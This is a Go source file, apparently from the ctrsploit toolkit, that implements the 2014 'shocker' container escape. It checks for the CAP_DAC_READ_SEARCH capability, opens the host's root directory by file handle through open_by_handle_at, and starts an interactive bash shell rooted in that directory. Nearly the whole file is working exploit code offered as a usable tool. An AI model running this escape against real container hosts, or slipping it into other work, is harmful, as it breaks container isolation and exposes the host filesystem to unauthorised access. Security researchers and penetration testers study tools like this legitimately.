package shocker

import (
	_ "embed"
	"fmt"
	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"golang.org/x/sys/unix"
	"os"
	"os/exec"
	"syscall"
)

var RootHandle = unix.NewFileHandle(1, []byte{
	0x02, // inode
	0, 0, 0, 0, 0, 0, 0,
})

type Vulnerability struct {
	vul.BaseVulnerability
}

var Shocker = Vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "shocker",
		Description: "Container escape with CAP_DAC_READ_SEARCH, alias shocker, found by Sebastian Krahmer (stealth) in 2014.",
		CheckSecPrerequisites: prerequisite.Prerequisites{
			&capability.CapDacReadSearchBnd,
		},
		ExploitablePrerequisites: prerequisite.Prerequisites{
			&capability.CapDacReadSearchEff,
		},
	},
}

func (v Vulnerability) GetRootFd() (rootFd int, err error) {
	hostReference, err := syscall.Open("/etc/hosts", syscall.O_RDONLY, 0)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	defer syscall.Close(hostReference)
	rootFd, err = unix.OpenByHandleAt(hostReference, RootHandle, unix.O_RDONLY)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	return
}

func (v Vulnerability) Chroot() (err error) {
	rootFd, err := v.GetRootFd()
	if err != nil {
		return
	}
	cmd := exec.Command("/bin/bash")
	cmd.Dir = fmt.Sprintf("/proc/self/fd/%d", rootFd)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	awesome_error.CheckFatal(cmd.Start())
	cmd.Wait()
	return
}

func (v Vulnerability) Exploit() (err error) {
	err = v.BaseVulnerability.Exploit()
	if err != nil {
		return
	}
	err = v.Chroot()
	return
}
